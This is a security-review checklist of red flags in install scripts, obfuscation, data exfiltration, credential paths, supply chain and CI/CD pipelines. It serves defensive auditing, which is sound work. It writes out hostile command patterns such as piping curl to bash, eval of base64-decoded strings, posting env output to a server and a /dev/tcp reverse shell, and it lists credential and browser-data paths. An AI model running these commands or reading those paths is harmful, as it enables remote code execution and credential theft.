# Red Flags Catalog

Patterns to look for during a security review. Organized by category.

---

## Install Scripts

### Critical
- `curl <url> | bash` or `wget <url> | sh` — executes remote code without inspection
- Downloading and running a binary from a URL with no checksum verification
- Overwriting system binaries (`/usr/local/bin`, `/usr/bin`) without warning
- Adding entries to `/etc/hosts`, `/etc/sudoers`, or shell profiles (`.bashrc`, `.zshrc`) without disclosure

### High
- Disabling security tools: `ufw disable`, `setenforce 0`, `systemctl stop firewalld`
- Requesting `sudo` or elevated privileges without a clear stated reason
- Using `nohup` or `&` to daemonize a process in the background silently
- Deleting install artifacts to cover tracks (`rm -rf /tmp/<installer>`)

### Medium
- Installing packages from unofficial mirrors or pinned to specific (possibly compromised) versions
- Modifying `PATH` or `LD_PRELOAD` environment variables
- Fetching additional scripts from external URLs during install

---

## Obfuscation

### Critical
- `eval $(base64 -d <<<'...')` or any eval on a decoded/dynamic string
- Multi-stage decoding: base64 → gzip → eval
- Variable names that are single characters or random strings with no comments
- Hex-encoded strings decoded and executed at runtime

### High
- Long single-line scripts with no whitespace or comments
- Functions named to look like system utilities (`ls_`, `init_`, `update_`)
- Conditional execution only when specific env vars are set (e.g. `if [ "$CI" != "true" ]`)

---

## Network & Data Exfiltration

### Critical
- Sending environment variables to an external server: `curl -d "$(env)" https://...`
- Uploading SSH keys, credentials files, or `.aws/credentials`
- Reverse shell patterns: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`
- DNS exfiltration: encoding data into DNS queries

### High
- Phoning home on install with system info (hostname, IP, username, OS version)
- Telemetry that is on by default with no opt-out, or opt-out that doesn't work
- Sending data to IPs rather than named domains (harder to block/audit)
- Using `curl` or `wget` in post-install hooks to fetch additional payloads

### Medium / Info
- Telemetry that is opt-in and clearly disclosed — note it but not necessarily a red flag
- Pinging a stats endpoint to count installs — common, low risk if no PII sent

---

## File System Red Flags

### Sensitive credential paths — accessing any of these is HIGH or CRITICAL

```
~/.ssh/*                  # SSH keys
~/.aws/*                  # AWS credentials
~/.azure/*                # Azure credentials
~/.config/gcloud/*        # GCP credentials
~/.kube/config            # Kubernetes config
~/.docker/config.json     # Docker registry auth
~/.netrc                  # Network credentials
~/.npmrc                  # npm auth tokens
~/.pypirc                 # PyPI auth tokens
~/.gitconfig              # Git credentials (may contain tokens)
~/.bash_history           # Command history
~/.zsh_history            # Command history
~/.*_history              # Any shell history
/etc/passwd               # System users
/etc/shadow               # Password hashes (Linux)
```

### Browser data — accessing these paths is CRITICAL

```
# Chrome
~/Library/Application Support/Google/Chrome/
~/.config/google-chrome/

# Firefox
~/Library/Application Support/Firefox/
~/.mozilla/firefox/

# Safari
~/Library/Safari/
```

Browser data directories contain saved passwords, cookies, and session tokens.

### Legitimate file access (expected, not a red flag)

```
~/.config/<app>/          # App-specific config
~/.local/share/<app>/     # App data
~/.cache/<app>/           # App cache
~/.local/state/<app>/     # App state/logs
```

Access to the tool's own config directory is normal. Flag only when a tool accesses directories it has no reason to touch.

---

## Supply Chain

### Critical
- Package name is a typosquat of a popular package (e.g. `reqeusts`, `colourama`, `lodash-utils`)
- Maintainer account was recently created or transferred
- The repo was recently forked from a legitimate project with changes in scripts/CI

### High
- `postinstall` hook in `package.json` that runs a script
- `setup.py` with custom `install` command that executes code
- Dependencies pinned to specific commits (not versions) pointing to forks
- CI/CD workflow has write access to package registry and can be triggered by PRs from forks

### Medium
- Unpinned dependencies that could be silently upgraded to a malicious version
- Dependency with very few downloads or a single maintainer for a critical package
- `package-lock.json` or `poetry.lock` not committed (can't verify what gets installed)

---

## CI/CD Pipelines

### Critical
- Workflow triggered by `pull_request_target` with access to secrets — exploitable by fork PRs
- Publishing steps that run on untrusted input (PR title, branch name) without sanitization

### High
- Secrets (`GITHUB_TOKEN`, `NPM_TOKEN`, `PYPI_TOKEN`) available in PR-triggered jobs
- `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` in privileged jobs
- Third-party GitHub Actions pinned to branch names (`@main`, `@master`) not commit SHAs

### Medium
- `GITHUB_TOKEN` with write permissions when read-only would suffice
- No dependency review or audit step in CI

---

## Repository Reputation Signals

These are not red flags on their own but add/reduce confidence:

| Signal | Risk Increase | Risk Decrease |
|--------|--------------|---------------|
| Repo created < 30 days ago | Yes | — |
| Maintainer account < 6 months old | Yes | — |
| No prior commits before the project appeared | Yes | — |
| Large stars gained in a short time | Possible (bought) | — |
| Active issue tracker with security responses | — | Yes |
| Listed in a curated awesome-* list | — | Yes |
| Used by well-known organizations | — | Yes |
| Regular release history spanning years | — | Yes |
| CVE history with patches applied promptly | Neutral | Slight |
